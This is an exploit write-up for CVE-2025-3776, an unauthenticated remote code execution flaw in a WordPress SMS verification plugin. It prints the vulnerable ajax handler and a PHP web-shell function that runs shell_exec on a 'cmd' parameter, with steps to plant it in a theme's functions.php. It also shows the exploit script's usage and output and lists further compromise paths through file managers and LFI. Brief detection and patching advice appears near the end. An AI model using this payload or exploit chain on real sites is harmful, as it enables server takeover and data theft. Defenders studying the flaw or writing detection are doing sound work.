
# CVE-2025-3776 - Remote Code Execution in "Verification SMS with TargetSMS" Plugin <= 1.5

## Plugin Information
- **Plugin Name:** Verification SMS with TargetSMS
- **Vulnerable Versions:** <= 1.5
- **CVE ID:** CVE-2025-3776
- **Type:** Remote Code Execution (RCE)
- **OWASP Classification:** A1: Injection
- **CVSS Severity:** 10.0 (Critical)
- **Required Privileges:** Unauthenticated
- **Published Date:** April 23, 2025

---

## Root Cause: Programming Mistake
The vulnerability originates from the use of `call_user_func()` on user-controlled input without sanitizing against a whitelist of allowed functions. This creates a logic flaw where any **existing PHP function in memory** can be executed without authentication, leading to a severe Remote Code Execution (RCE) condition.

## Vulnerable Code Location
File: `/inc/ajax.php`

```php
add_action('wp_ajax_nopriv_targetvrHHndler', 'targetvr_ajax_handler');

function targetvr_ajax_handler(){
    $callback = targetvr_get_postData('callback', 'string');

    if ($callback and function_exists($callback)){
        call_user_func($callback);
    } else {
        targetvr_return_json(false);
    }

    wp_die();
}
```

This code allows unauthenticated users to trigger any function that exists in memory, including malicious ones if the attacker is able to load them.

---

## How to Test This Vulnerability

### ✅ Prerequisites
To exploit this vulnerability successfully, a callable function must already exist in the WordPress environment. Since WordPress plugins and themes can auto-load functions, the attacker can inject their own function through the active theme’s `functions.php` file.

### 📍 File to Modify:
```
target.com/wp-content/themes/twentytwentyfour/functions.php
```

### 🛠️ Inject the following payload at the end of `functions.php`:
```php
function evil() {
    if (isset($_GET['cmd'])) {
        echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';
    } else {
        echo '<pre>' . shell_exec("whoami") . '</pre>';
    }
    exit;
}
```

> ✅ This ensures the `evil()` function is loaded into memory and becomes executable via `call_user_func()`.

---

## Exploitation Steps Using Python Script

### ✅ Usage:
```bash
python3 CVE-2025-3776.py -u http://target.com -c "id"
```

### ✅ Example Output:
```bash
[*] Checking plugin version...
[+] Plugin version detected: 1.5
[+] Plugin is vulnerable. Proceeding with exploitation...
[*] Sending exploit request...
[+] Exploit succeeded!
<pre>uid=1(daemon) gid=1(daemon) groups=1(daemon)</pre>

Exploit By : Nxploited ( Khaled Alenazi )
```

---

## Python Script Help Menu:
```bash
usage: CVE-2025-3776.py [-h] -u URL [-c CMD]

CVE-2025-3776 Exploit for TargetSMS Plugin <= 1.5

# Exploit by Nxploited ( Khaled Alenazi )

options:
  -h, --help     show this help message and exit
  -u, --url URL  Target WordPress site URL
  -c, --cmd CMD  Command to execute (default: whoami)
```

---

## Behavior Without Injection
If no `evil()` function or similar is available in memory:
- The request will result in:
```json
{"status":false}
```
- This means the callback function does not exist, and the exploit fails safely.

---

## Real-World Exploitation Paths
- **Theme File Injection:** Modify the active theme’s `functions.php` (as demonstrated).
- **Via File Manager Plugins:** Use any plugin like *WP File Manager* to upload PHP file containing `evil()`.
- **Via LFI or include flaws:** Use an existing Local File Inclusion (LFI) to include uploaded file that contains a malicious function.

---

## Risk and Impact
Once a malicious function is loaded, an unauthenticated attacker can:
- Execute arbitrary shell commands
- View sensitive server files
- Pivot into full site or server compromise

---

## Recommendation
- Immediately disable or remove the plugin if running version <= 1.5
- Restrict access to file editing via wp-admin
- Patch or replace the plugin with secure alternatives

---

## Detection
Look for repeated POST requests to:
```
/wp-admin/admin-ajax.php?action=targetvrHHndler
```
With `callback=evil` or any unexpected function names

---

## Legal Disclaimer
This information is provided for educational and ethical research purposes only. The author is not responsible for any misuse or damage caused by the use of this information.

---

## Exploit Attribution
**Exploit By**: Nxploited (Khaled Alenazi)
